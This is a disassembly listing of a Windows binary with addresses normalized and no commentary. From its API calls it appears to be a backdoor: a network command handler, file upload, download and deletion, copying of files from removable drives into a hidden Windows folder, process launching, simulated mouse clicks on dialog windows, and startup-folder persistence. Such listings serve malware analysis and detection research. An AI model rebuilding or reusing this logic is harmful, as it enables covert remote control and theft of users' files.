call [ Ordinal_WSOCK32_9@IAT ]
push rw-data
mov [ ebp - 0x1a ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_4@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
mov eax esi
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
sub_40254e
push ebp
mov ebp esp
mov eax 0x2008
call sub_4044d0
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_401d04
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ fopen@IAT ]
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call [ fseek@IAT ]
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_402f6f
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_401d04
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
push edi
push [ ebp + 0xc ]
call [ SetFileAttributesA@IAT ]
push [ ebp + 0xc ]
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
push eax
call [ fread@IAT ]
mov ebx eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
lea eax [ ebp - 0x2008 ]
push esi
push eax
call sub_4022d5
lea eax [ ebp - 0x2008 ]
push ebx
push eax
call sub_401c77
add esp 0x28
test eax eax
je r-xdata
sub_4026e5
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_402f6f
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
sub_40278e
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x50
jg r-xdata
sub eax 0x52
je r-xdata
je r-xdata
call sub_402c46
dec eax
je r-xdata
call sub_4031c5
jmp r-xdata
sub eax 0x41
je r-xdata
push 0x1
pop eax
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_401d04
add esp 0x18
call sub_4026d2
jmp r-xdata
sub eax 0x3
je r-xdata
cmp [ rw-data ] esi
mov [ rw-data ] 0x1
je r-xdata
dec eax
je r-xdata
call sub_402f94
jmp r-xdata
dec eax
dec eax
jne r-xdata
call sub_402c64
jmp r-xdata
dec eax
dec eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_4026e5
jmp r-xdata
dec eax
je r-xdata
sub eax 0x5
je r-xdata
jmp r-xdata
sub_4028d3
push ebx
mov ebx [ GetTickCount@IAT ]
push ebp
push esi
push edi
call ebx
mov edi eax
mov [ rw-data ] edi
mov ebp edi
push 0x1
pop eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
call ebx
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
mov eax esi
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_401987
mov edi esi
mov eax esi
sub eax ebp
cmp eax 0x2710
jbe r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] esi
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
mov ebp esi
cmp [ rw-data ] 0x0
je r-xdata
sub_402943
push ebp
mov ebp esp
mov eax 0x2004
call sub_4044d0
push ebx
push esi
mov esi [ ebp - 0x4 ]
push edi
mov edi [ Sleep@IAT ]
xor ebx ebx
mov al [ ebp - 0x2004 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_402a4d
test eax eax
je r-xdata
mov [ rw-data ] bl
push eax
lea eax [ ebp - 0x2004 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x2004 ]
push 0x5
push eax
call sub_402aae
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp - 0x2003 ]
cmp esi 0x5
jl r-xdata
push 0x1
call edi
cmp [ rw-data ] ebx
jne r-xdata
cmp esi ebx
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call edi
jmp r-xdata
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2004 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2004 ]
push esi
push eax
call sub_402aae
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
sub_402a4d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ Sleep@IAT ]
xor ebx ebx
test eax eax
jle r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_402aae
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_402b1a
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_401d04
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_402c64
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push [ rw-data ]
push eax
call memcpy
mov esi [ strrchr@IAT ]
push 0x5c
push [ rw-data ]
call esi
push eax
call sub_402eaf
lea eax [ ebp - 0x214 ]
push 0x5c
push eax
call esi
add esp 0x20
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call strcat
push 0x7d00
mov [ ebp - 0x14 ] 0x42
call [ malloc@IAT ]
mov edi eax
add esp 0xc
test edi edi
je r-xdata
and [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x214 ]
push eax
call sub_402e43
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
push edi
call [ free@IAT ]
pop ecx
test esi esi
jne r-xdata
lea eax [ esi + esi * 4 ]
push 0x5
shl eax 0x6
add eax 0x5
mov [ ebp - 0x13 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_401d04
pop ecx
lea eax [ ebp - 0x214 ]
pop ecx
push edi
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
jne r-xdata
push 0x1
pop esi
push edi
call sub_402efc
test eax eax
pop ecx
je r-xdata
lea eax [ edi + 0x2c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x8 ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_4022d5
push ebx
push edi
call sub_401c77
push edi
call [ free@IAT ]
add esp 0x24
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea ebx [ esi - 0x1 ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0xc ]
mov ebx 0x140
push eax
push edi
push ebx
push edi
call sub_4022d5
push ebx
push edi
call sub_401c77
add esp 0x18
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push edi
push [ ebp - 0x4 ]
call sub_402df7
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push edi
call [ free@IAT ]
pop ecx
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
add [ ebp - 0x8 ] eax
lea esi [ eax + eax * 4 ]
lea eax [ ebp - 0xc ]
shl esi 0x6
push eax
push edi
push esi
push edi
call sub_4022d5
push esi
push edi
call sub_401c77
add esp 0x18
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
jl r-xdata
sub_402df7
push ebx
push esi
mov esi [ FindNextFileA@IAT ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
push [ esp + 0x14 ]
mov eax ebx
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_402efc
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp ebx 0x64
jge r-xdata
inc ebx
add edi 0x140
push edi
push [ esp + 0x14 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_402e43
push ebp
mov ebp esp
sub esp 0x140
push esi
lea eax [ ebp - 0x140 ]
push edi
push eax
push [ ebp + 0x8 ]
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
lea eax [ ebp - 0x140 ]
push eax
call sub_402efc
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push esi
call [ FindClose@IAT ]
jmp r-xdata
sub_402eaf
and [ rw-data ] 0x0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
push edi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
and [ esi ] 0x0
test esi esi
jne r-xdata
mov eax [ rw-data ]
inc [ rw-data ]
mov [ eax * 4 + rw-data ] edi
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop edi
sub_402efc
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
test [ eax ] 0x10
push edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
add eax 0x2c
push 0x2e
push eax
call [ strrchr@IAT ]
xor ebp ebp
pop ecx
cmp [ rw-data ] ebp
pop ecx
mov ebx eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor eax eax
mov edi [ lstrcmpiA@IAT ]
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push [ esi ]
mov eax [ esi ]
inc eax
inc eax
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
inc ebp
add esi 0x4
cmp ebp [ rw-data ]
jl r-xdata
call edi
test eax eax
je r-xdata
push rw-data
push [ esi ]
call edi
test eax eax
je r-xdata
sub_402f6f
push ebp
mov ebp esp
push ecx
push ecx
mov al [ rw-data ]
push 0x6
mov [ ebp - 0x3 ] al
pop eax
mov [ ebp - 0x7 ] eax
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x52
push eax
call sub_401d04
pop ecx
pop ecx
leave
retn
sub_402f94
push ebp
mov ebp esp
sub esp 0x108
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
add eax 0x4
push eax
call strlen
mov edi eax
pop ecx
cmp edi 0x114
mov [ ebp - 0x8 ] edi
jae r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov esi rw-data
add eax 0x4
push eax
push esi
call strcpy
cmp [ rw-data ] 0x56
pop ecx
pop ecx
jne r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_402f6f
cmp [ rw-data ] 0x56
jne r-xdata
push ebx
push esi
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push 0x100
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push esi
call strcpy
add esp 0x18
push esi
call sub_40310a
pop ecx
push rw-data
push rw-data
jmp r-xdata
mov [ rw-data ] 0x45
call sub_402f6f
jmp r-xdata
mov eax [ rw-data ]
lea edi [ eax + edi + 0x5 ]
mov eax [ rw-data ]
sub eax [ ebp - 0x8 ]
sub eax 0x5
jmp r-xdata
push esi
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
push ecx
push edi
push eax
push edi
call sub_4022d5
push ebx
push [ ebp - 0x4 ]
push 0x1
push edi
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x24
cmp [ rw-data ] 0x0
je r-xdata
sub_40310a
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_4031c5
push ebp
mov ebp esp
sub esp 0x408
mov [ rw-data ] 0x4f
call sub_402f6f
push [ rw-data ]
call strlen
pop ecx
mov ecx [ rw-data ]
add eax ecx
cmp [ eax - 0x2 ] 0x3a
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ SetFileAttributesA@IAT ]
push [ rw-data ]
call strlen
mov ecx [ rw-data ]
and [ eax + ecx - 0x1 ] 0x0
push [ rw-data ]
lea eax [ ebp - 0x408 ]
push rw-data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
call sub_403295
add esp 0x18
cmp [ eax - 0x1 ] 0x5c
je r-xdata
leave
retn
sub_403295
push ebp
mov ebp esp
mov eax 0x126c
call sub_4044d0
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ wsprintfW@IAT ]
lea eax [ ebp - 0xc6c ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x364 ]
push eax
lea eax [ ebp - 0xc6c ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop eax
mov edi rw-data
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
cmp [ ebp - 0x338 ] 0x2e
je r-xdata
lea eax [ ebp - 0x364 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x338 ]
push eax
lea eax [ ebp - 0x564 ]
push eax
call [ wcscpy@IAT ]
test [ ebp - 0x364 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0xa ]
push [ rw-data ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
lea eax [ ebp - 0x864 ]
push rw-data
push eax
call esi
mov eax [ rw-data ]
add esp 0x1c
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
push [ rw-data ]
mov ebx [ sprintf@IAT ]
lea eax [ ebp - 0x664 ]
push rw-data
push eax
call ebx
mov eax [ rw-data ]
add esp 0xc
inc [ rw-data ]
cmp eax 0x1869f
jle r-xdata
lea eax [ ebp - 0x564 ]
push 0x2e
push eax
call [ wcsrchr@IAT ]
mov ebx eax
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0xe6c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
add esp 0x18
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
lea eax [ ebp - 0x564 ]
push eax
lea eax [ ebp - 0x126c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x664 ]
push eax
lea eax [ ebp - 0x114 ]
push [ ebp + 0xc ]
push rw-data
push eax
call ebx
add esp 0x20
lea eax [ ebp - 0x114 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x126c ]
push eax
call sub_403295
pop ecx
test eax eax
pop ecx
je r-xdata
and [ rw-data ] 0x0
add ebx 0x2
lea eax [ ebp - 0x864 ]
push ebx
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xa64 ]
push rw-data
push eax
call esi
add esp 0x14
lea eax [ ebp - 0x864 ]
push eax
lea eax [ ebp - 0xa64 ]
push [ ebp + 0xc ]
push rw-data
push eax
call esi
add esp 0x10
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0xa64 ]
push 0x0
push eax
lea eax [ ebp - 0xe6c ]
push eax
call [ CopyFileW@IAT ]
jmp r-xdata
sub_4034e9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi [ GetWindow@IAT ]
push 0x5
push esi
call edi
push eax
call sub_4034e9
pop ecx
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_4036ac
pop ecx
push esi
call sub_403525
test eax eax
pop ecx
je r-xdata
pop edi
sub_403525
push ebp
mov ebp esp
sub esp 0x500
mov al [ rw-data ]
push esi
push edi
push 0x1f
mov [ ebp - 0x80 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x7f ]
[ edi ]
mov esi [ ebp + 0x8 ]
push 0x80
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x80 ]
push eax
push esi
call [ GetClassNameA@IAT ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
inc eax
cmp eax 0x1d
mov [ rw-data ] eax
jge r-xdata
mov al [ rw-data ]
push 0x7f
mov [ ebp - 0x280 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x27f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x280 ]
push 0x200
push eax
push esi
call [ GetWindowTextA@IAT ]
mov ecx [ rw-data ]
mov eax ecx
imul eax eax 0x208
cmp [ eax + rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
imul ecx ecx 0x208
cmp [ ecx + rw-data ] 0x0
jne r-xdata
lea eax [ eax + rw-data ]
push eax
lea eax [ ebp - 0x280 ]
push eax
call strcmp
neg eax
sbb eax eax
pop ecx
inc eax
pop ecx
mov [ ebp + 0x8 ] eax
jne r-xdata
imul eax eax 0x208
add eax rw-data
push eax
lea eax [ ebp - 0x80 ]
push eax
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push rw-data
push esi
call [ GetWindowRect@IAT ]
push eax
lea eax [ ebp - 0x280 ]
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push esi
push [ rw-data ]
lea eax [ ebp - 0x500 ]
push rw-data
push eax
call [ sprintf@IAT ]
push 0xa
pop eax
mov [ rw-data ] eax
mov [ rw-data ] eax
lea eax [ ebp - 0x80 ]
push rw-data
push eax
call strcmp
add esp 0x34
test eax eax
jne r-xdata
mov ecx [ rw-data ]
pop edi
pop esi
leave
retn
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x12c
jne r-xdata
mov [ rw-data ] 0xb5
mov [ rw-data ] 0x35
sub_4036ac
mov eax [ rw-data ]
imul eax eax 0x208
cmp [ eax + rw-data ] 0x0
je r-xdata
call sub_40371e
mov eax [ rw-data ]
push rw-data
imul eax eax 0x208
add eax rw-data
push eax
call strcmp
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push edi
mov esi [ SendMessageA@IAT ]
mov edi 0xa0005
push edi
push 0x0
push 0x201
push [ esp + 0x18 ]
call esi
push edi
push 0x0
push 0x202
push [ esp + 0x18 ]
call esi
pop edi
pop esi
retn
sub [ rw-data ] 0x14
jmp sub_40371e
sub_40371e
push ebx
push ebp
push esi
mov esi [ GetSystemMetrics@IAT ]
xor ebp ebp
push edi
push ebp
call esi
mov ebx 0xffff
mov ecx eax
mov eax ebx
dec ecx
cdq
idiv ecx
push 0x1
mov edi eax
call esi
mov ecx eax
mov eax ebx
cdq
dec ecx
push ebp
idiv ecx
push ebp
mov esi [ mouse_event@IAT ]
mov ebx eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8001
call esi
mov ebp [ Sleep@IAT ]
push 0x28
call ebp
mov eax [ rw-data ]
push 0x0
sub eax [ rw-data ]
push 0x0
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8002
call esi
push 0x28
call ebp
mov eax [ rw-data ]
push 0x0
sub eax [ rw-data ]
push 0x0
imul eax ebx
push eax
mov eax [ rw-data ]
sub eax [ rw-data ]
imul eax edi
push eax
push 0x8004
call esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4037dc
push ebp
mov ebp esp
sub esp 0x104
push 0x0
lea eax [ ebp - 0x104 ]
push 0x18
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
leave
retn
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
call [ DeleteFileA@IAT ]
sub_40382e
push ebp
mov ebp esp
sub esp 0x310
push esi
xor esi esi
push esi
lea eax [ ebp - 0x108 ]
push 0x18
push eax
push esi
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
push [ ebp + 0x8 ]
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push esi
push eax
call [ _access@IAT ]
add esp 0x18
test eax eax
jne r-xdata
push esi
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push esi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
cmp [ ebp + 0x14 ] esi
je r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x310 ]
push 0x104
push eax
lea eax [ ebp - 0x108 ]
push 0xffffffff
push eax
push esi
push esi
call [ MultiByteToWideChar@IAT ]
